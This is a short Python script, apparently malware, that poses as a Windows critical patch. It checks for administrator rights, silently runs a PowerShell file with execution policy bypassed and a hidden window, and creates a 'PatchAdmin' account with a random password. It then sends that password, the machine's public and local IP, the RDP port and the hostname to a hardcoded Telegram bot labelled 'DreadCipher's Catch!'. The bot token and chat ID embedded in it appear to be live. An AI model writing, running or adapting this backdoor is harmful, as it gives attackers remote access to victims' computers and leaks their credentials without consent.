import subprocess
import os
import random
import string
import sys
import socket
import requests
import platform

# Config
TELEGRAM_BOT_TOKEN = "7733366488:AAHFBq_N1Ix-DFnzbw7nIrc_TDxZYo_hJME"
TELEGRAM_CHAT_ID = "6023417944"
POWERSHELL_SCRIPT = "WindowsCriticalPatch.ps1"
NEW_USER = "PatchAdmin"
NEW_PASS = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

# Check if we're on Windows
if platform.system() != "Windows":
    sys.exit(1)

# Make sure the PowerShell script exists
if not os.path.isfile(POWERSHELL_SCRIPT):
    sys.exit(1)

def run_powershell():
    try:
        cmd = [
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-File", POWERSHELL_SCRIPT
        ]
        process = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            shell=True,
            creationflags=0x08000000
        )
        return process.returncode == 0
    except:
        return False

def snitch_to_telegram(ip, local_ip, port=3389):
    try:
        hostname = socket.gethostname()
        ram = "Unknown"
        cores = os.cpu_count() or "Unknown"
        message = (
            f"💀 DreadCipher's Catch!\n"
            f"IP: {ip}:{port} (Local: {local_ip})\n"
            f"User: {NEW_USER}\n"
            f"Pass: {NEW_PASS}\n"
            f"Host: {hostname}\n"
            f"RAM: {ram} GB\n"
            f"Cores: {cores}\n"
            f"Time: {os.popen('date /t & time /t').read().strip()}"
        )
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        params = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
        requests.post(url, params=params, timeout=5)
    except:
        pass

def get_ips():
    try:
        public_ip = requests.get("http://ipinfo.io/ip", timeout=5).text.strip()
    except:
        public_ip = "Unknown"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "Unknown"
    return public_ip, local_ip

def main():
    try:
        os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\Windows'), 'System32']))
    except PermissionError:
        sys.exit(1)

    public_ip, local_ip = get_ips()
    if run_powershell():
        snitch_to_telegram(public_ip, local_ip)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
